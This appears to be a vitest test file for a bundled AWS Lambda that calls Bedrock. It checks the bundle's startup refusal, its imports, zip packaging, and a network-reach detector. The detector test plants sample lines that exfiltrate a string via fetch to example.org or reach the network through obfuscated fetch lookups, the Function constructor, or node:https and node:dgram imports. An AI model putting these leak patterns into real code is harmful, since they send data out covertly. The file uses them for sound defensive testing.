import { fileURLToPath } from "node:url";
// The built function (dist/index.mjs, zipped in dist/explain.zip) runs on its
// own. All current models fail startup on missing evidence, before fetch.
// SigV4 and the synthetic transport are verified separately. `npm test` builds first.

import { existsSync, readFileSync, readdirSync, writeFileSync } from "node:fs";
import { inflateRawSync } from "node:zlib";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import { ENV, FakeAws, httpEvent } from "./helpers.js";

const dist = fileURLToPath(new URL("../dist/", import.meta.url));
const aws = new FakeAws();
const hosts: string[] = [];
let handler: (event: unknown) => Promise<{ statusCode: number; body: string }>;

beforeAll(async () => {
  if (!existsSync(`${dist}index.mjs`)) throw new Error("dist/ is missing: run `npm run build` (npm test builds first)");
  // Sonnet's native output bound is not Converse accounting/input-bound proof.
  // No production model is silently substituted to make this artifact callable.
  for (const [k, v] of Object.entries({ ...ENV, EXPLAIN_MODEL_ID: "us.anthropic.claude-sonnet-5-5", EXPLAIN_PRICE_OUT: "11.00" })) vi.stubEnv(k, v);
  vi.stubGlobal("fetch", async (url: string, init: RequestInit) => {
    const u = new URL(url);
    hosts.push(u.host);
    const headers = init.headers as Record<string, string>;
    const service = u.host.startsWith("dynamodb.") ? "dynamodb" : "bedrock";
    const reply = await aws.transport({
      service,
      host: u.host,
      method: init.method as "GET" | "POST",
      path: u.pathname,
      headers,
      body: typeof init.body === "string" ? init.body : "",
      timeoutMs: 1000,
    });
    return new Response(reply.body === "" ? null : reply.body, { status: reply.status, headers: reply.headers });
  });
  const mod = (await import(`${dist}index.mjs`)) as { handler: typeof handler };
  handler = mod.handler;
});

afterAll(() => {
  vi.unstubAllEnvs();
  vi.unstubAllGlobals();
});

describe("the built function", () => {
  it("refuses a real production request before any AWS call while evidence is unknown", async () => {
    const r = await handler(httpEvent());
    expect(r.statusCode).toBe(503);
    expect(JSON.parse(r.body)).toEqual({v:1,error:"paused"});
    expect(hosts).toEqual([]);
  });

  it("contains the synthetic test override in neither its config nor registry", () => {
    expect(readFileSync(`${dist}index.mjs`,"utf8")).not.toContain("synthetic fixture, not Bedrock evidence");
    expect(hosts).toEqual([]);
  });

  it("imports nothing but Node's own modules", () => {
    const code = readFileSync(`${dist}index.mjs`, "utf8");
    const imports = [...code.matchAll(/^import .* from "([^"]+)";$/gm)].map((m) => m[1]);
    expect(imports.every((i) => i!.startsWith("node:"))).toBe(true);
    expect(code).not.toMatch(/require\(|@aws-sdk|node_modules/);
  });

  it("zips index.mjs alone, reproducibly", () => {
    const zip = readFileSync(`${dist}explain.zip`);
    const view = new DataView(zip.buffer, zip.byteOffset, zip.byteLength);
    expect(view.getUint32(0, true)).toBe(0x04034b50);
    const nameLength = view.getUint16(26, true);
    const size = view.getUint32(18, true);
    const name = new TextDecoder().decode(zip.subarray(30, 30 + nameLength));
    expect(name).toBe("index.mjs");
    const data = inflateRawSync(zip.subarray(30 + nameLength, 30 + nameLength + size));
    const bundle = readFileSync(`${dist}index.mjs`);
    expect(data.length).toBe(bundle.length);
    expect(data.every((b, i) => b === bundle[i])).toBe(true);
    // One entry: the end record counts one file.
    expect(view.getUint16(zip.length - 22 + 10, true)).toBe(1);
    expect(readFileSync(`${dist}explain.zip.sha256`, "utf8")).toMatch(/^[0-9a-f]{64} {2}explain\.zip\n$/);
  });
});

describe("only the AWS transport can reach the network (RT2: the engine and the rule pack are bundled too)", () => {
  it("flags any other bundled file that names fetch or another way out, in code, comments or data", async () => {
    const { networkReach, NETWORK_MODULE } = await import("../scripts/build.mjs");
    const planted = [
      "export const leak = (s: string) => fetch(`https://example.org/?q=${s}`);",
      "export const leak = (s: string) => (globalThis as any)['fe' + 'tch'](s);",
      "export const x = [].constructor.constructor('return this')();",
      "import('node:https');",
      "export const s = { rules: 'node:dgram' };",
      "export const t = global['fetch'];",
    ];
    const names = planted.map((body, i) => {
      const rel = `dist/planted-${i}.ts`;
      writeFileSync(`${dist}planted-${i}.ts`, body);
      return rel;
    });
    expect(networkReach(names)).toEqual(names);
    writeFileSync(`${dist}planted-ok.ts`, "import { fetchTransport } from './x.js'; // a global inference profile\nexport const f = fetchTransport;");
    expect(networkReach(["dist/planted-ok.ts", NETWORK_MODULE])).toEqual([]);
  });

  it("finds nothing in the engine's source, the rule pack or the function's own files", async () => {
    const { networkReach } = await import("../scripts/build.mjs");
    const engine = readdirSync(`${dist}../../engine/src`).filter((f) => f.endsWith(".ts")).map((f) => `../engine/src/${f}`);
    const pack = readdirSync(`${dist}../../engine/src/generated`).map((f) => `../engine/src/generated/${f}`);
    expect(engine.length).toBeGreaterThan(3);
    expect(networkReach([...engine, ...pack, "../../rules/biasclear-rules.json", "data/moves.json", "src/index.ts", "src/app.ts"])).toEqual([]);
  });
});
